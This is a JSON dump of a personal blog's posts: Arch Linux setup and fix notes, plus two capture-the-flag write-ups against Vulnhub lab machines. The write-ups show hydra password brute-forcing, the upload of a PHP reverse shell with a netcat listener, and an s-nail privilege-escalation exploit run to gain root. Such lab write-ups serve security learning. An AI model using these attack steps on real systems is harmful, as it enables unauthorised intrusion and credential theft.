16384 eDP-1 connected primary 1920x1080+0+0 (normal left inverted right x axis y axis) 344mm x 194mm 1920x1080 59.98*+ 59.97 59.96 59.93 1680x1050 59.95 59.88 1400x1050 59.98 1600x900 59.99 59.94 59.95 59.82 1280x1024 60.02 1400x900 59.96 59.88 1280x960 60.00 1440x810 60.00 59.97 1368x768 59.88 59.85 1280x800 59.99 59.97 59.81 59.91 1280x720 60.00 59.99 59.86 59.74 1024x768 60.04 60.00 960x720 60.00 928x696 60.05 896x672 60.01 1024x576 59.95 59.96 59.90 59.82 960x600 59.93 60.00 960x540 59.96 59.99 59.63 59.82 800x600 60.00 60.32 56.25 840x525 60.01 59.88 864x486 59.92 59.57 700x525 59.98 800x450 59.95 59.82 640x512 60.02 700x450 59.96 59.88 640x480 60.00 59.94 720x405 59.51 58.99 684x384 59.88 59.85 640x400 59.88 59.98 640x360 59.86 59.83 59.84 59.32 512x384 60.00 512x288 60.00 59.92 480x270 59.63 59.82 400x300 60.32 56.34 432x243 59.92 59.57 320x240 60.05 360x202 59.51 59.13 320x180 59.84 59.32 DP-1-0 disconnected (normal left inverted right x axis y axis) DP-1-1 disconnected (normal left inverted right x axis y axis) DP-1-2 disconnected (normal left inverted right x axis y axis) DP-1-3 disconnected (normal left inverted right x axis y axis) HDMI-1-0 disconnected (normal left inverted right x axis y axis) I have 6 screen and 5 of them are disconnected.The screen eDP-1 is connected. Change the resolutionxrandr --output eDP-1 --auto","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"My games are unplayable","slug":"Low_fps_in_games","date":"2021-08-01T17:15:52.000Z","updated":"2022-09-27T07:49:11.068Z","comments":true,"path":"/post/Low_fps_in_games.html","link":"","permalink":"https://peanutstick.github.io/post/Low_fps_in_games.html","excerpt":"","text":"The problemMy games was unplayable of very slow.My NVIDIA GPU was at 100% but seam like he burn resources for nothing.I used prime-run to run them, then I change for optimus-manager but it was the same. The solutionSwith from NVIDIA to hybrid. optimus-manager --switch hybrid Set hybrid at startup optimus-manager --set-startup hybrid","categories":[{"name":"Fix","slug":"Fix","permalink":"https://peanutstick.github.io/categories/Fix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Set shortcut with i3 for brightness.","slug":"Set_shortcut_for_brightness","date":"2021-07-31T18:23:52.000Z","updated":"2022-09-27T07:49:10.111Z","comments":true,"path":"/post/Set_shortcut_for_brightness.html","link":"","permalink":"https://peanutstick.github.io/post/Set_shortcut_for_brightness.html","excerpt":"","text":"Set shortcut with i3 for brightness.Install blight for AURgit clone https:&#x2F;&#x2F;aur.archlinux.org&#x2F;blight.git cd blight makepkg -si The doc: https://github.com/RPigott/blight Set the shortcutcd ~&#x2F;.config&#x2F;i3 vim config I added this on this file: bindsym $mod+F5 exec blight set -5% bindsym $mod+F6 exec blight set +5% Now reload I3 with mod+shift+rDecrease brightness: mod+F5Increase brightness: mod+F6","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Inferno","slug":"CTF_Inferno","date":"2021-07-19T16:59:52.000Z","updated":"2022-09-27T07:49:10.004Z","comments":true,"path":"/post/CTF_Inferno.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Inferno.html","excerpt":"","text":"CTF InfernoDiscoveryLink to download the vm: VulnhubInfo: There are two flags netdiscoversudo netdiscover -r 192.168.0.0/16IP: 192.168.0.22 nmapsudo nmap -sV -p- 192.168.0.22Ports:22: ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)80: http Apache httpd 2.4.38 ((Debian)) Port 80I found nothing with the inspector.let&#39;s translate the text and run a dirbuster. Translate Corsica English Oh quanto parve a me gran maraviglia Oh how wonderful it seemed to me when I quand&#39;io vidi tre facce a la sua testa! saw three faces on his head! L&#39;una dinanzi, e quella era vermiglia; One in front, and that was red; l&#39;altr&#39;eran due, che s&#39;aggiugnieno a questa the other was two, which are added to this sovresso &#39;l mezzo di ciascuna spalla, over the middle of each shoulder, e se&#39; giugnieno al loco de la cresta and they reached the place of the ridge Directory listeningsudo dirbusterLet&#39;s go to http://192.168.0.22/infernoI&#39;m stuck with a login portal Apache/2.4.38The version of Apache seem outdated.Exploit databases:https://www.exploit-db.com/exploits/46676hmmm, thois exploit is not for now, I have to upload the php file on the webserver first.And them I will be able to execute commands as root.Local Privilege Escalation Google imageI put the image in google image:Title: Divine Comedy Illustrated by BotticelliBotticelli, Sandro, 1485, map of hell, But I still can&#39;t login. Install cewlI have some text but even in english or french I don&#39;t understand, they should be usefull.Source: Null-byteHe use cewl.It&#39;s not available with pacman or AUR so I will search in on GitHub.GitHub: CeWLI also need ruby: sudo pacman -S rubyAnd bundle: gem install bundlerWarning: You don&#39;t have /home/peanutstick/.local/share/gem/ruby/3.0.0/bin in your PATH,gem executables will not run.Add to path: export PATH=$PATH:~/.local/share/gem/ruby/3.0.0/binMake it persitent:In /etc/profil add this in the good section.append_path &#39;/home/peanutstick/.local/share/gem/ruby/3.0.0/bin&#39; cd &#x2F;usr&#x2F;share git clone https:&#x2F;&#x2F;github.com&#x2F;digininja&#x2F;CeWL.git cd Cewl bundle install It&#39;s borring to move in the directory and type ruby cewl.rb, so I will add and alias.~/.zshrcalias cewl=&quot;ruby /usr/share/Cewl/cewl.rb&quot; Create the wordlistcewl -w infernowordlist.txt http://192.168.0.22 ExploitDictionary attack on Basic HTTP AuthenticationSource https://github.com/gnebbia/hydra_notesNow let&#39;s try:Nop: hydra -L infernowordlist.txt -P infernowordlist.txt -s 80 -f 192.168.0.22 http-get /infernoNop: hydra -L infernowordlist.txt -P rockyou.txt -s 80 -f 192.168.0.22 http-get /infernoNop: hydra -L rockyou.txt -P infernowordlist.txt -s 80 -f 192.168.0.22 http-get /inferno My wordlist is useless?! I just spend 1 hour to install Cewl and I don’t need it.Don&#39;t know: hydra -L rockyou.txt -P rockyou.txt -s 80 -f 192.168.0.22 http-get /infernoIt’s take too much time so I will try other users:Yep: hydra -l admin -P rockyou.txt -s 80 -f 192.168.0.22 http-get /infernoUser: adminPassword: dante1I can browser the files of the web site, I have to found a way to upload a file. Try to upload a fileThe exploits on exploit db dosen&#39;t work.I will read more files to see if I can find something intresting.I can upload files here: /inferno/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/So I download a revers shell for pentestmonkey: https://github.com/pentestmonkey/php-reverse-shellI set the $IP = ‘192.168.0.16’ (it&#39;s my machine)and I upload it.Them I listen with netcat: netcat -lvp 1234.And got to http://192.168.0.22/inferno/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/reversshell.phpAnd I&#39;m in!I&#39;m using grep to see files with .txt, I found 2 binaries in download.grep &quot;.txt&quot; . -ROh I forgot… this command is use to search things in files.I can try with the word flag.I can&#39;t open them it’s only binaries.I will see what is in the directory:ls -laI found an hiden flag: .download.datcat .download.dat c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a$ If I decode it I get that: Â«Or seâ tu quel Virgilio e quella fonte che spandi di parlar sÃ¬ largo fiume?Â», rispuosâio lui con vergognosa fronte. Â«O de li altri poeti onore e lume, vagliami âl lungo studio e âl grande amore che mâha fatto cercar lo tuo volume. Tu seâ lo mio maestro e âl mio autore, tu seâ solo colui da cuâ io tolsi lo bello stilo che mâha fatto onore. Vedi la bestia per cuâ io mi volsi; aiutami da lei, famoso saggio, châella mi fa tremar le vene e i polsiÂ». I have to do something with it.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://peanutstick.github.io/tags/Pentest/"}]},{"title":"Fix the blur with picom","slug":"Fix_picom_blur_not_working","date":"2021-07-18T20:40:52.000Z","updated":"2022-09-27T07:49:11.148Z","comments":true,"path":"/post/Fix_picom_blur_not_working.html","link":"","permalink":"https://peanutstick.github.io/post/Fix_picom_blur_not_working.html","excerpt":"","text":"Fix the blur with picomuninstall picomThe blur is avalaible only for the git version,So if you have it from pacman you have to remove it. sudo pacman -R picom Install picomThis is the git:https://aur.archlinux.org/packages/picom-git/ git clone https:&#x2F;&#x2F;aur.archlinux.org&#x2F;picom-git.git cd picon-git makepkg -si Start it with i3I have to add experimental-backends in my config..config/i3/config exec --no-startup-id picom -b --experimental-backends Picom confI have nothing to add on it but you can modify things like you want..config/picom/picom.conf","categories":[{"name":"Fix","slug":"Fix","permalink":"https://peanutstick.github.io/categories/Fix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Configure the touchpad [I3]","slug":"Configure_touchpad_on_i3","date":"2021-07-16T00:16:52.000Z","updated":"2022-09-27T07:49:10.928Z","comments":true,"path":"/post/Configure_touchpad_on_i3.html","link":"","permalink":"https://peanutstick.github.io/post/Configure_touchpad_on_i3.html","excerpt":"","text":"Configure the touchpad [I3]Config:Let’s use xorg server and create the file:sudo mkdir /etc/X11/xorg.conf.d/90-touchpad.confNow edit it: Section &quot;InputClass&quot; Identifier &quot;touchpad&quot; MatchIsTouchpad &quot;on&quot; Driver &quot;libinput&quot; Option &quot;Tapping&quot; &quot;on&quot; Option &quot;TappingButtonMap&quot; &quot;lrm&quot; # lrm &#x3D; right click lmr &#x3D; middle click Option &quot;NaturalScrolling&quot; &quot;on&quot; Option &quot;ScrollMethod&quot; &quot;twofinger&quot; # 2 fingers to scroll EndSection And reboot.","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Send a file via ssh","slug":"Send_file_via_ssh","date":"2021-07-14T02:15:52.000Z","updated":"2022-09-27T07:49:11.088Z","comments":true,"path":"/post/Send_file_via_ssh.html","link":"","permalink":"https://peanutstick.github.io/post/Send_file_via_ssh.html","excerpt":"","text":"Send a file via sshCommandThe file you want to send:/var/www/html/index.html The destination: user@IP:/home/peanutstick/Document/index.htmlSo the command will be:scp /var/www/html/index.html user@IP:/home/peanutstick/index.html You can add -P to specify the port.It take too much time to write and if it’s always the same destination directory you can write a fonction. FonctionIn the .bashrc. send() &#123; scp -P 8765 &#x2F;home&#x2F;peanutstick&#x2F;Documents&#x2F;markdown&#x2F;&quot;$1&quot; peanutstick@65.21.51.64:&#x2F;var&#x2F;www&#x2F;html&#x2F;peanutstick.com&#x2F;source&#x2F;_posts&#x2F;&quot;$1&quot; &#125; Usage:send My_post.mdYou can rename send like you want.The $1 will be My_post.md. I use it now because I was writing my post directly from the VPS because I’m too lazy to open filezilla and click click everywhere.The problem by writing it directly on the VPS via ssh is if you are incative too much time, you will loose the connection and the work will be not saved.","categories":[{"name":"Service","slug":"Service","permalink":"https://peanutstick.github.io/categories/Service/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Install nvidia driver on Arch Linux","slug":"Install-nvidia-driver","date":"2021-07-13T15:48:52.000Z","updated":"2022-09-27T07:49:09.668Z","comments":true,"path":"/post/Install-nvidia-driver.html","link":"","permalink":"https://peanutstick.github.io/post/Install-nvidia-driver.html","excerpt":"","text":"Install and configure nvidia driver on Arch LinuxFind the right driverTo install your driver you should read the wiki, my solution may not work for you.NVIDIA - ArchWiki To see what graphics card you have:lspci -k | grep -A 2 -E &quot;(VGA|3D)&quot; Output 00:02.0 VGA compatible controller: Intel Corporation CoffeeLake-H GT2 [UHD Graphics 630] Subsystem: Lenovo Device 39fe Kernel driver in use: i915 -- 01:00.0 VGA compatible controller: NVIDIA Corporation GP107M [GeForce GTX 1050 Mobile] (rev a1) Subsystem: Lenovo Device 39fe Kernel driver in use: nvidia Wish driver you need:CodeNamesThis is what i have:NV137 (GP107) GeForce GTX (1050, 1050 Ti)I’m above NV110 so I install the nvidia drinver and not the nvidia-lts one. sudo pacman -S nvidia nvidia-utils nvidia-prime nvidia-settings I use prime-run for the moment to use my GPU only when I need, but I will try NVIDIA Optimus.D’ont create a conf file for Xorg, the conf is inplemented in the driver. Configure mkinitcpioThe doc:Early KMS startDRM_Kernel_mode_settingIn the file /etc/mkinitcpio.confReplace MODULES=() by MODULES=(i915 nvidia). TestsEnable ssh:sudo systemctl enable sshdFirst thing to do is reboot:It can work now but if it’s broken after the rebbot it’s useless. Download glxinfo from AUR:prime-run glxinfoIf you have an output without errror it’s good.The nvidia setting: nvidia-setting You should download nvtop via pacman: sudo pacman -S nvtop And run nvtop to see the consumption.","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Restore a backup with timeshift","slug":"Restore-backup","date":"2021-07-11T23:59:52.000Z","updated":"2022-09-27T07:49:10.048Z","comments":true,"path":"/post/Restore-backup.html","link":"","permalink":"https://peanutstick.github.io/post/Restore-backup.html","excerpt":"","text":"Restore a backup with timeshiftmount the partitionsmount &#x2F;dev&#x2F;nvme0n1p2 &#x2F;mnt mount &#x2F;dev&#x2F;nvme0n1p3 &#x2F;mnt&#x2F;home Chrootarch-chroot &#x2F;mnt &#x2F;bin&#x2F;bash restoretimeshift --restore Select snapshot: 0 &gt; 2021-07-08_20-00-02 D W1 &gt; 2021-07-09_21-00-02 D2 &gt; 2021-07-10_00-00-37 O3 &gt; 2021-07-10_15-00-35 O4 &gt; 2021-07-10_16-48-33 O5 &gt; 2021-07-11_10-00-02 D6 &gt; 2021-07-11_12-23-57 O I will take the last one:6Re-install GRUB2 bootloader?NDo you know the risk ?YAnd now you have to wait until it&#39;s done. if you see Restore completed you can continue. unmount &amp; rebootexit umount -R &#x2F;mnt reboot","categories":[{"name":"Fix","slug":"Fix","permalink":"https://peanutstick.github.io/categories/Fix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"wine: could not load kernel32.dll, status c0000135","slug":"Repare-wine","date":"2021-07-11T16:50:52.000Z","updated":"2022-09-27T07:49:09.611Z","comments":true,"path":"/post/Repare-wine.html","link":"","permalink":"https://peanutstick.github.io/post/Repare-wine.html","excerpt":"","text":"wine: could not load kernel32.dll, status c0000135The wine and winecfg command wasn’t working, darksouls on steam wasn&#39;t able to start.So I tryed to fix it and there is my solution.sudo rm ~/.wine -RAnd now run winecfg","categories":[{"name":"Fix","slug":"Fix","permalink":"https://peanutstick.github.io/categories/Fix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Add a partition in linux","slug":"Create_new_partition_linux","date":"2021-07-11T01:06:52.000Z","updated":"2022-09-27T07:49:09.941Z","comments":true,"path":"/post/Create_new_partition_linux.html","link":"","permalink":"https://peanutstick.github.io/post/Create_new_partition_linux.html","excerpt":"","text":"Create the new partitionCreate the partitionchose the hard drive: fdisk -l And them create the partition: cfdisk &#x2F;dev&#x2F;sda Once it’s done you have to set the type. mkfs.ext4 &#x2F;dev&#x2F;sda2 For me it’s sda2 because I already use sda1 for the downloads, the sda2 will be for my games. Create the directoryCreate the directory for the partition: mkdir &#x2F;home&#x2F;peanutstick&#x2F;games And give the own: sudo chown peanutstick $HOME&#x2F;games -R Mount the partitionmount &#x2F;dev&#x2F;sda2 &#x2F;home&#x2F;peanutstick&#x2F;games Set it in fstabIf you don’t do if the changes will not be saved after a reboot. sudo vim &#x2F;etc&#x2F;fstab Now add this: &#x2F;dev&#x2F;sda2 &#x2F;home&#x2F;peanutstick&#x2F;games ext4 defaults 0 0","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Get a shell when Arch Linux is broken","slug":"Save-Arch-linux","date":"2021-07-07T04:55:56.000Z","updated":"2022-09-27T07:49:09.514Z","comments":true,"path":"/post/Save-Arch-linux.html","link":"","permalink":"https://peanutstick.github.io/post/Save-Arch-linux.html","excerpt":"","text":"Get a shell when arch don&#39;t bootBoot on a USB LiveGo to the boot menu and select the USB key with arch Select Arch Linux install medium LoadkeysI will set my keyboard in french: loadkeys fr Mount the partitionwith fdisk -l locate the right device I have: /dev/nvme0n1p1 for the boot /dev/nvme0n1p2 for the system /dev/nvme0n1p3 for the swap I will mount the system: mount &#x2F;dev&#x2F;nvme0n1p2 &#x2F;mnt chrootedarch-chroot &#x2F;mnt &#x2F;bin&#x2F;bash","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Installing AUR packages","slug":"Install-AUR-packages","date":"2021-07-04T11:45:52.000Z","updated":"2022-09-27T07:49:09.361Z","comments":true,"path":"/post/Install-AUR-packages.html","link":"","permalink":"https://peanutstick.github.io/post/Install-AUR-packages.html","excerpt":"","text":"Installing AUR packagesInstall gitsudo pacman -S git Install base develsudo pacman -S base-devel Find the packageVisit AUR: https://aur.archlinux.org/ find the git clone URL of the chosen package. it should look like this: https://aur.archlinux.org/opencv3-opt.git Create directoryIf it’s your first package you should create a directory for the AUR packages mkdir ~&#x2F;AUR Build itgit clone [the package], cd [the package], makepkg -si","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF-gigachad","slug":"CTF_gigachad","date":"2021-07-01T02:15:52.000Z","updated":"2022-09-27T07:49:09.368Z","comments":true,"path":"/post/CTF_gigachad.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_gigachad.html","excerpt":"","text":"CTF-gigachadDiscoverylink: vulnhub-GAGACHADThe only information we have it’s there is multiple flags. Discovery and ScanningnetdiscoverFast scan with netdiscover. sudo netdiscover -r 192.168.0.0&#x2F;16 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor &#x2F; Hostname ---------------------------------------------------------------------------- 192.168.0.19 08:00:27:d0:52:bc 1 42 PCS Systemtechnik GmbH nmapsudo nmap -sV -p- 192.168.0.19 Nmap scan report for 192.168.0.19 Host is up (0.00010s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21&#x2F;tcp open ftp vsftpd 3.0.3 22&#x2F;tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80&#x2F;tcp open http Apache httpd 2.4.38 ((Debian)) MAC Address: 08:00:27:D0:52:BC (Oracle VirtualBox virtual NIC) Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel We have the port 21, 22 and 80 open and it&#39;s a debian machine. port 80Let&#39;s to to http://192.168.0.19 and see what I can find.With the inspector(F12) I found a key:A7F9B77C16A3AA80DAA4E378659226F628326A95 D82D10564866FD9B201941BCC6C94022196F8EE8 DirbusterI run a dirbuster with a common wordlist.dirbuster -u http://192.168.0.19/ -l Wordlist-common.txtOh… I found 500 directories, I stop the scan, it&#39;s useless HashIs an SHA-1 hash:a7f9b77c16a3aa80daa4e378659226f628326a95 = fuck youD82D10564866FD9B201941BCC6C94022196F8EE8 = VIRGINMaybe it’s a password or a user. I got all what I need so I can go to the FTP part. port 21ftp 192.168.0.19bash: ftp : commande introuvableoh, I use arch BTW (and I&#39;m french)sudo pacman -S inetutilsNow we can play.ftp 192.168.0.19user: anonymouspassword: password 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; I&#39;m in, let’s see what we can have with ls. -r-xr-xr-x 1 1000 1000 297 Feb 07 17:33 chadinfo Good, I have to read it.Download: ftp&gt;get chadinfoRead: cat chadinfo PK 0 HR���ƃchadinfoUT �j &#96;Zj &#96;ux why yes, ####################### username is chad ??????????????????????? password? !!!!!!!!!!!!!!!!!!!!!!! go to &#x2F;drippinchad.png PK 0 HR���ƃ��chadinfoUT�j &#96;ux PKN� User: chadPassword: in the image drippinchad.pnghttp://192.168.0.19/drippinchad.png I will use google image to see where is it.It&#39;s maiden&#39;s tower it should be the password.After multiples attempts the password is maidenstower I&#39;m connected as chad:we have the directory ftp with the chadinfo,and also user.txt.I download and read it. flag 1&#x2F;2 ░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄ ░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄ ░░░░█░░░░░░░░░░░░░░░░░░░░░░█ ░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█ ░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█ █░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█ █░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█ ░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█ ░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█ ░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█ ░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█ ░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█ ░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█ ░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█ ░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█ ░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀ ░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄ ░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█ ░░█░░▌░█░░█░░█░░░█░░█░░█ ░░█░░▀▀░░██░░█░░░█░░█░░█ ░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█ Nice, I think I&#39;m done with the ftp, I go to sleep I will continue tomorrow. Port 22I&#39;m back. I will try to connect to ssh with previous creds:User: chadPassword: maidenstower ssh chad@192.168.0.19 I&#39;m in! I am in his home directory, I will display what’s in: ls -la drwxr-xr-x 4 chad chad 4096 Jul 16 06:51 . drwxr-xr-x 3 root root 4096 Feb 7 14:57 .. dr-xr-xr-x 2 chad chad 4096 Feb 7 16:41 ftp drwx------ 3 chad chad 4096 Jul 16 06:51 .gnupg -r-x------ 1 chad chad 1805 Jan 3 2021 user.txt .gnupg seem intresting I have the directory private-keys-v1.d, but it’s empty. Vulnerability AssessmentFind permsHausec pentest-cheatsheepFind Binaries that will execute as the owner:find / -perm -u=s -type f 2&gt;/dev/nullThis is what I found: &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign &#x2F;usr&#x2F;lib&#x2F;s-nail&#x2F;s-nail-privsep &#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device &#x2F;usr&#x2F;bin&#x2F;passwd &#x2F;usr&#x2F;bin&#x2F;mount &#x2F;usr&#x2F;bin&#x2F;chfn &#x2F;usr&#x2F;bin&#x2F;umount &#x2F;usr&#x2F;bin&#x2F;newgrp &#x2F;usr&#x2F;bin&#x2F;su &#x2F;usr&#x2F;bin&#x2F;gpasswd &#x2F;usr&#x2F;bin&#x2F;chsh s-nail look instresting:s-nail -V v14.8.6 ExploitI found this on exploit database:S-nail &lt; 14.8.16 - Local Privilege Escalation14.8.6 = 14.8.60 or 14.8.06 ?Let’s try it. touch exploit.shvi exploit.shPast this: https://www.exploit-db.com/raw/47172Escape, :wq.chmod + x exploit.sh./exploit.shResult: [-] Failed. Not vulnerable? [.] Cleaning up... [-] Failed This is the only exploit on exploit database, what I did wrong?I&#39;m trying to download the file in the chad machine but the terminal is so buggy.I will use scp to give him the file.scp 47172.sh chad@192.168.0.19:/tmp/exploit.shType the password: maidenstowerI have to run is with bash because ./ don&#39;t work, and I have too much errors now.I think the machine is broken or maybe my shell,I have some errors and it&#39;s my first CTF with this machine.I fixed it with this here.So let&#39;s run the script and fail again, so I spamed it and I&#39;m in!I will change my shell /bin/bash.I&#39;m roo so let’s see what is in /root/ directory. # cat root.txt flag 2&#x2F;2 ░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄ ░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄ ░░░░█░░░░░░░░░░░░░░░░░░░░░░█ ░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█ ░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█ █░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█ █░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█ ░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█ ░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█ ░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█ ░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█ ░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█ ░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█ ░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█ ░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█ ░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀ ░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄ ░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█ ░░█░░▌░█░░█░░█░░░█░░█░░█ ░░█░░▀▀░░██░░█░░░█░░█░░█ ░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█ congratulations! Nice, the CTF is over, it was easy.There is an image, I will download it:Receiver machine: nc -l -p 1234 &gt; chad.pngSender machine: nc -w 192.168.0.16 &lt; chad.png This is the end, I hope you liked it, it was my first writeup.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://peanutstick.github.io/tags/Pentest/"}]},{"title":"Arch Linux installation guide","slug":"Install-ArchLinux","date":"2021-07-01T02:15:52.000Z","updated":"2022-09-27T07:49:09.844Z","comments":true,"path":"/post/Install-ArchLinux.html","link":"","permalink":"https://peanutstick.github.io/post/Install-ArchLinux.html","excerpt":"","text":"Install Arch on nvme drive, UEFI systemChange layoutI will set the layout in French, because I am French. loadkeys fr Set passwordThis is the first step for me, because without password I can’t use SSH. passwd Connect via SSHI will use ssh to copy past the commands,To get you’r IP addresse. ip a look like this for me: 192.168.0.25 On your other computer open a terminal or putty of what you want to connect via SSH. Partitionsto see your hard drive. fdisk -l Delete them. cfdisk &#x2F;dev&#x2F;nvme0n1 cfdisk &#x2F;dev&#x2F;sda Create 3 partition, 1: 512Mb EFI 2: 20Gb File system (root) 2: 80Gb File system (home) And Format them: This one for EFI mkfs.fat -F32 &#x2F;dev&#x2F;nvme0n1p1 The two other like this: mkfs.ext4 &#x2F;dev&#x2F;nvme0n1p2 mkfs.ext4 &#x2F;dev&#x2F;nvme0n1p3 Them mount the root partition mount &#x2F;dev&#x2F;nvme0n1p2 &#x2F;mnt mkdir 